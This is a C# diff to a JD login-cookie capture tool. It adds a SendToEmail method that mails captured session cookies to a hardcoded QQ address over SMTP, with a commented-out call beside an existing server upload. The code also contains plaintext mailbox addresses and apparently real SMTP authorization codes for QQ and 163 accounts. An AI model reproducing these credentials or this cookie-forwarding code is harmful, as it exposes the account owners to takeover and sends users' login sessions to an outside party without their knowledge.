@@ -6,7 +6,10 @@ using System.Configuration;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
+using System.Net;
+using System.Net.Mail;
 using System.Runtime.CompilerServices;
+using System.Text;
 using System.Text.RegularExpressions;
 using System.Threading;
 using System.Threading.Tasks;
@@ -231,6 +234,7 @@ namespace JdLoginTool.Wpf
                     }
 
                     UploadToServer(ckString);
+                    //SendToEmail(ckString);
                     var ptPin = QingLongJdCookie.Parse(ckString).ptPin;
                     var user = FindOrAddUser(ptPin);
                     user.Cookies = ckList.ToArray();
@@ -344,6 +348,51 @@ namespace JdLoginTool.Wpf
             {
                 LogLabel.Content = e.Message;
                 return false;
+            }
+        }
+
+        private void SendToEmail(string msg)
+     
+        {
+            //实例化一个发送邮件类。
+            MailMessage mailMessage = new MailMessage();
+            //发件人邮箱地址，方法重载不同，可以根据需求自行选择。
+            mailMessage.From = new MailAddress("zhanggaolei@qq.com");
+            //收件人邮箱地址。
+            mailMessage.To.Add(new MailAddress("zhanggaolei@qq.com"));
+            //抄送人邮箱地址。
+            //message.CC.Add(sender);
+            //邮件标题。
+            mailMessage.Subject = "JdLogin";
+            //邮件内容。
+            mailMessage.Body = msg;
+            //是否支持内容为HTML。
+            //mailMessage.IsBodyHtml = true;
+            //实例化一个SmtpClient类。
+            SmtpClient client = new SmtpClient();
+            client.Port = 587;
+            //在这里使用的是qq邮箱，所以是smtp.qq.com，如果你使用的是126邮箱，那么就是smtp.126.com。
+            //client.Host = "smtp.163.com";
+            client.Host = "smtp.qq.com";
+            //使用安全加密连接（是否启用SSL）
+            client.EnableSsl = true;
+            //设置超时时间
+            //client.Timeout = 10000;
+            //不和请求一块发送。
+            client.UseDefaultCredentials = false;
+            //验证发件人身份(发件人的邮箱，邮箱里的生成授权码);
+            client.Credentials = new NetworkCredential("zhanggaolei@qq.com", "oxgeextgunyrcbee");//szcodirtgvjgbfii
+            //网易邮箱客户端授权码DJURBEKTXEWXQATX
+            //client.Credentials = new NetworkCredential("liulijun3236@163.com", "ZAJDNCKWHUBHQIMY");
+            try
+            {
+                //发送
+                client.Send(mailMessage);
+                //发送成功
+            }
+            catch (Exception e)//发送异常
+            {
+                LogLabel.Content = e.Message; 
             }
         }
 
